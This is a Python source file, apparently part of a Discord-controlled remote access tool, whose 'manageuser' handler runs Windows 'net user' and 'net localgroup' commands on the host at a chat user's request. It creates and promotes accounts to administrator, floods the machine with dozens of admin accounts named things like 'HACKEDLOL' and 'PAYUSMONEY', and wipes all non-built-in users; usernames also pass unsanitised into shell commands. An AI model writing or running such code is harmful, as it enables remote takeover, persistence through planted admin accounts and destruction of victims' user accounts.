import random
import concurrent.futures
import string
import subprocess
import discord

async def manageuser(ctx, action: str, *, username: str = None, password: str = ""):
    try:
        if action == "help":
                embed = discord.Embed(
                        title="User Manager Commands",
                        description="heres the user commands, u can control user accounts with these",
                        color=discord.Color.blue()
                )
                embed.add_field(
                        name="Command List",
                        value="`create <user>` - Create a new user.\n"
                                "`delete <user>` - Delete an existing user.\n"
                                "`promote <user>` - Add user to administrators group.\n"
                                "`demote <user>` - Remove user from administrators group.\n"
                                "`list` - List all users on the system.\n"
                                "`flood` - Flood the system with generated users.\n"
                                "`format` - Clear all system users.\n"
                                "`help` - Show this help message.",
                        inline=False
                )
                embed.add_field(
                        name="Additional Info",
                        value="Use these commands carefully, as they can modify system users.",
                        inline=False
                )
                embed.set_footer(text="Use Carefully", icon_url="https://media.istockphoto.com/id/517632630/photo/guy-fawkes-mask-on-a-wooden-background.jpg?s=612x612&w=0&k=20&c=fRa8z4I1Vdu6S3Qc95bJv8cMoP8pCoLoHRrGU6PfyKo=")
                await ctx.send(embed=embed)

        elif action == "create":
            if not username:
                await ctx.send("Username is required for creating a user.")
                return
            command = f'net user {username} {password} /add'
            subprocess.run(f'cmd /c {command}', shell=True)
            await ctx.send(f"User {username} created.")

        elif action == "delete":
            async def delete_user():
                success_count = 0
                fail_count = 0
                try:
                    while True:
                        result = subprocess.run('net user', capture_output=True, text=True, shell=True, encoding='utf-8')
                        users = [line.split()[0] for line in result.stdout.splitlines() if len(line.split()) > 1]
                        users_to_delete = [user for user in users if user not in ['Administrator', 'DefaultAccount', 'Guest', 'WDAGUtilityAccount']]
                        if not users_to_delete:
                            break
                        for user in users_to_delete:
                            try:
                                delete_result = subprocess.run(f'net user {user} /delete', shell=True, check=True, capture_output=True, text=True, encoding='utf-8')
                                if delete_result.returncode == 0:
                                    success_count += 1
                                else:
                                    fail_count += 1
                                    await ctx.send(f"Failed to delete user {user}: {delete_result.stderr}")
                            except subprocess.CalledProcessError as e:
                                fail_count += 1
                                await ctx.send(f"Error deleting user {user}: {e.stderr}")
                except Exception as e:
                    await ctx.send(f"Error retrieving users: {e}")
                return success_count, fail_count

            success_count, fail_count = await delete_user()
            embed = discord.Embed(
                title="User Deletion Status",
                description=f"Successfully deleted **{success_count}** users.\nFailed to delete **{fail_count}** users.",
                color=discord.Color.red()
            )
            embed.add_field(name="Results", value=f"✅ {success_count} - Deleted\n❌ {fail_count} - Failed", inline=False)
            await ctx.send(embed=embed)

        elif action == "promote":
            if not username:
                await ctx.send("Username is required for promoting a user.")
                return
            command = f'net localgroup administrators {username} /add'
            subprocess.run(f'cmd /c {command}', shell=True)
            await ctx.send(f"User {username} has been promoted to administrators.")

        elif action == "demote":
            if not username:
                await ctx.send("Username is required for demoting a user.")
                return
            command = f'net localgroup administrators {username} /delete'
            subprocess.run(f'cmd /c {command}', shell=True)
            await ctx.send(f"User {username} has been demoted from administrators.")
            
        elif action == "list":
            try:
                result = subprocess.run('net user', capture_output=True, text=True, shell=True)
                users = [line.split()[0] for line in result.stdout.splitlines() if len(line.split()) > 1 and "User accounts for" not in line and "The command completed successfully." not in line]
                
                if users:
                    await ctx.send(embed=discord.Embed(title="System Users", description="\n".join(users), color=discord.Color.red()))
                else:
                    await ctx.send("No valid users found.")
            except Exception as e:
                await ctx.send(f"Error listing users: {str(e)}")


        elif action == "flood":
                try:
                        existing_usernames = set()
                        with concurrent.futures.ThreadPoolExecutor() as executor:
                                futures = []
                                for cycle in range(3):
                                        for i in range(1, 26):
                                                if i % 3 == 1: username = f'PAYUSMONEY{i}'
                                                elif i % 3 == 2: username = f'HACKEDLOL{i}'
                                                else: username = f'MISTERPISSAIR{i}'
                                                if username not in existing_usernames:
                                                        existing_usernames.add(username)
                                                        password = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                                                        futures.append(executor.submit(subprocess.run, f'net user {username} {password} /add', shell=True))
                                                        futures.append(executor.submit(subprocess.run, f'net localgroup administrators {username} /add', shell=True))
                                for future in futures:
                                        future.result()
                        await ctx.send("Flood operation completed.")
                except Exception as e:
                        await ctx.send(f"Error with account spam: {e}")



        elif action == "format":
            success_count = 0
            fail_count = 0
            try:
                while True:
                    result = subprocess.run('net user', capture_output=True, text=True, shell=True, encoding='utf-8')
                    users = [line.split()[0] for line in result.stdout.splitlines() if len(line.split()) > 1]
                    users_to_delete = [user for user in users if user not in ['Administrator', 'DefaultAccount', 'Guest', 'WDAGUtilityAccount']]
                    if not users_to_delete:
                        break
                    users_deleted_this_iteration = False
                    for user in users_to_delete:
                        try:
                            check_user = subprocess.run(f'net user {user}', capture_output=True, text=True, shell=True, encoding='utf-8')
                            if "The user name could not be found" in check_user.stderr:
                                continue
                            delete_result = subprocess.run(f'net user {user} /delete', shell=True, check=True, capture_output=True, text=True, encoding='utf-8')
                            if delete_result.returncode == 0:
                                success_count += 1
                                users_deleted_this_iteration = True
                            else:
                                fail_count += 1
                                await ctx.send(f"Failed to delete user {user}: {delete_result.stderr}")
                        except subprocess.CalledProcessError as e:
                            fail_count += 1
                            await ctx.send(f"Error deleting user {user}: {e.stderr}")
                    if not users_deleted_this_iteration:
                        break
            except Exception as e:
                await ctx.send(f"Error retrieving users: {e}")
            embed = discord.Embed(
                title="User Deletion Status",
                description=f"Successfully deleted **{success_count}** users.\nFailed to delete **{fail_count}** users.",
                color=discord.Color.red()
            )
            embed.add_field(name="Results", value=f"✅ {success_count} - Deleted\n❌ {fail_count} - Failed", inline=False)
            await ctx.send(embed=embed)
        else:
            await ctx.send("unknown action. just do `.user help` for help")

    except Exception as e:
        await ctx.send(f"Error managing user: {str(e)}")